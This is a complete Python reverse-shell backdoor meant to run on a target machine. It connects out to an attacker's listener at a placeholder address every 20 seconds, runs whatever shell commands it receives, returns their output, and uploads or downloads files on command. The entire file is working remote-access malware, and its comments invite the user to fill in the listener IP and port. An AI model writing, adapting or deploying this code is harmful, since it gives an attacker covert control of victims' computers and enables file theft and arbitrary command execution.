import socket
import time
import subprocess
import json
import os

#This function sends data to listener
def reliable_send(data):
        jsondata = json.dumps(data)
        s.send(jsondata.encode())

#This function recieves data from listener
def reliable_recv():
        data = ''
        while True:
                try:
                        data = data + s.recv(1024).decode().rstrip()
                        return json.loads(data)
                except ValueError:
                        continue

# This function creates coonection between target machine and listener
def connection():
	while True:
		time.sleep(20) #It tries to connect to listener every 20 seconds if it is not connected to listener
		try:
			s.connect(('IP-Listener',Port)) # You need to change this
			shell()
			s.close()
			break
		except:
			connection()

#This function upload files to listener
def upload_file(file_name):
	f = open(file_name, 'rb')
	s.send(f.read())


#This function download files from listener
def download_file(file_name):
        f = open(file_name, 'wb')
        s.settimeout(1)
        chunk = s.recv(1024)
        while chunk:
                f.write(chunk)
                try:
                        chunk = s.recv(1024)
                except socket.timeout as e:
                        break
        s.settimeout(None)
        f.close()

# This is shell where all the commands are executed
def shell():
	while True:
		command = reliable_recv()
		if command == 'quit':
			break
		elif command == 'clear':
			pass
		elif command[:3] == 'cd ':
			os.chdir(command[3:])
		elif command[:8] == 'download':
			upload_file(command[9:])
		elif command[:6] == 'upload':
			download_file(command[7:])
		else:
			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = execute.stdout.read() + execute.stderr.read()
			result = result.decode()
			reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
